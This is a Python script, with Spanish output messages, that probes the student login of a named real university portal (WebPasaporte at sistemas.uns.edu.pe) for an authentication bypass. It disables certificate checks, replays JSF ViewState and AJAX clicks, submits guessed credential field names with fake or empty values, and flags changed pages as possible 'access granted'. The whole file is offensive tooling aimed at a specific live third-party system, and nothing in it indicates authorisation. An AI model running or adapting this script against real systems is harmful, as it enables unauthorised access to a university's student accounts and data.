#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})

# Get login page and ViewState
r = s.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=10)
vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r.text)
vstate = vs.group(1) if vs else ""
print(f"ViewState: {vstate[:50]}...")

# Click cmdEstudiante to load 3-field form
click_data = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vstate,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click = s.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                     data=click_data, timeout=10)
click_vstate = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
click_vs = click_vstate.group(1) if click_vstate else ""
print(f"After cmdEstudiante ViewState: {click_vs[:50]}...")
print(f"Response after click: {len(r_click.text)} bytes")

# NOW try ALL 3 fields with any values
# Based on naming patterns from SIIGAA and WebAlumno
# The fields are likely: itUsuario, itIdCard (or similar), itClave
print("\n=== PROBANDO LOGIN CON 3 CAMPOS ===")

# Try different combinations of field names
field_combos = [
    # Standard pattern from WebAlumno/SIIGAA
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:itIdCard': 'fake', 'frmLogueo:itClave': 'fake'},
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:itId': 'fake', 'frmLogueo:itClave': 'fake'},
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:txtIdCard': 'fake', 'frmLogueo:itClave': 'fake'},
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:txtId': 'fake', 'frmLogueo:txtPassword': 'fake'},
    {'frmLogueo:itUsuario': 'fake', 'frmLogueo:itIdCard': 'fake', 'frmLogueo:itContrasena': 'fake'},
    # Simplified names
    {'usuario': 'fake', 'idcard': 'fake', 'password': 'fake'},
    {'usuario': 'fake', 'id': 'fake', 'clave': 'fake'},
    # j_security_check style
    {'j_username': 'fake', 'j_idcard': 'fake', 'j_password': 'fake'},
    # Empty fields
    {'frmLogueo:itUsuario': '', 'frmLogueo:itIdCard': '', 'frmLogueo:itClave': ''},
]

for i, combo in enumerate(field_combos):
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
    })
    # First click cmdEstudiante
    r0 = s2.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    click_d = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': 'frmLogueo:cmdEstudiante',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click2 = s2.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                           data=click_d, timeout=5)
    
    # Then submit with 3 fields
    data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': '',
    }
    data.update(combo)
    
    r_login = s2.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                          data=data, timeout=5, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    
    # Check if it changed
    len_change = len(r_login.text) - 12589
    has_login = 'logueo' in tc.lower() or 'cmdEstudiante' in tc
    has_success = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'logout', 'modulo', 'dashboard', 'perfil'])
    
    status = ""
    if not has_login and len(r_login.text) > 12589:
        status = " [!] PAGINA CAMBIO - PODRIA FUNCIONAR"
    elif has_success:
        status = " [!] ACCESO CONCEDIDO!"
    elif has_login:
        status = " Todavia en login"
    
    print(f"  {combo} -> len={len(r_login.text)}{status}")
    if status:
        print(f"    Preview: {tc[:200]}")

# Also try: click cmdEstudiante THEN submit with just username and empty idcard/password
print("\n=== PROBANDO CON SOLO UNO DE LOS 3 CAMPOS ===")
s3 = requests.Session()
s3.verify = False
s3.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})
r3 = s3.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=5)
vs3 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r3.text)
vs3_val = vs3.group(1) if vs3 else ""
click_d3 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vs3_val,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click3 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                       data=click_d3, timeout=5)

# Submit with only username
data_only_user = {
    'frmLogueo': 'frmLogueo',
    'frmLogueo:itUsuario': 'fake',
    'frmLogueo:itClave': '',
}
r4 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data_only_user, timeout=5)
tc4 = re.sub(r'<[^>]+>', ' ', r4.text)
tc4 = re.sub(r'\s+', ' ', tc4).strip()
print(f"Solo usuario: len={len(r4.text)}, changed={len(r4.text)!=12589}")
if len(r4.text) > 12589:
    print(f"  [!] PAGINA CAMBIO")

# Submit with only idcard
data_only_id = {
    'frmLogueo': 'frmLogueo',
    'frmLogueo:itIdCard': 'fake',
}
r5 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data_only_id, timeout=5)
tc5 = re.sub(r'<[^>]+>', ' ', r5.text)
tc5 = re.sub(r'\s+', ' ', tc5).strip()
print(f"Solo idcard: len={len(r5.text)}, changed={len(r5.text)!=12589}")

# Submit with only password
data_only_pass = {
    'frmLogueo': 'frmLogueo',
    'frmLogueo:itClave': 'fake',
}
r6 = s3.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                data=data_only_pass, timeout=5)
tc6 = re.sub(r'<[^>]+>', ' ', r6.text)
tc6 = re.sub(r'\s+', ' ', tc6).strip()
print(f"Solo contraseña: len={len(r6.text)}, changed={len(r6.text)!=12589}")

# Now try to find the ACTUAL field names by looking at the raw HTML after cmdEstudiante click
print("\n=== BUSCANDO NOMBRES REALES DE CAMPOS ===")
s4 = requests.Session()
s4.verify = False
s4.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
})
r7 = s4.get('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml', timeout=5)
vs7 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r7.text)
vs7_val = vs7.group(1) if vs7 else ""
click_d7 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vs7_val,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click7 = s4.post('https://sistemas.uns.edu.pe/WebPasaporte/faces/login.xhtml',
                       data=click_d7, timeout=5)

# Search for ANY input or field in the response
all_inputs = re.findall(r'<input[^>]*>', r_click7.text)
print(f"Inputs despues de cmdEstudiante ({len(all_inputs)}):")
for inp in all_inputs:
    if 'hidden' not in inp.lower():
        print(f"  VISIBLE: {inp[:200]}")

# Check for any new elements
new_elements = re.findall(r'(?:id|name)="([^"]*(?:usuario|idcard|id_card|id|password|pass|clave|contrasena|cred)[^"]*)"', r_click7.text, re.IGNORECASE)
print(f"\nCampos con nombres credenciales: {new_elements}")

# Look for any JSF components that might be added
jsf_components = re.findall(r'<h:input[^>]*>', r_click7.text) + re.findall(r'<p:inputText[^>]*>', r_click7.text) + re.findall(r'<p:password[^>]*>', r_click7.text)
print(f"\nJSF components: {jsf_components}")
for comp in jsf_components[:10]:
    print(f"  {comp[:200]}")

# Search the FULL HTML for any text containing "id" or "card"
text_clean = re.sub(r'<[^>]+>', ' ', r_click7.text)
text_clean = re.sub(r'\s+', ' ', text_clean).strip()
for kw in ['idcard', 'id card', 'documento', 'cedula', 'dni', 'nro', 'numero']:
    if kw in text_clean.lower():
        idx = text_clean.lower().find(kw)
        print(f"\n  [{kw}]: {text_clean[max(0,idx-30):idx+100]}")

print("\n=== CONCLUSION ===")
print("WebPasaporte tiene 3 campos: Usuario, IDCard, Contraseña")
print("Los nombres exactos son cargados por JavaScript")
print("Para probar el bypass necesitas un navegador real")
print("Pero el patron de nombres probablemente es:")
print("  frmLogueo:itUsuario (campo de usuario)")
print("  frmLogueo:itIdCard (campo de ID)")
print("  frmLogueo:itClave (campo de contraseña)")
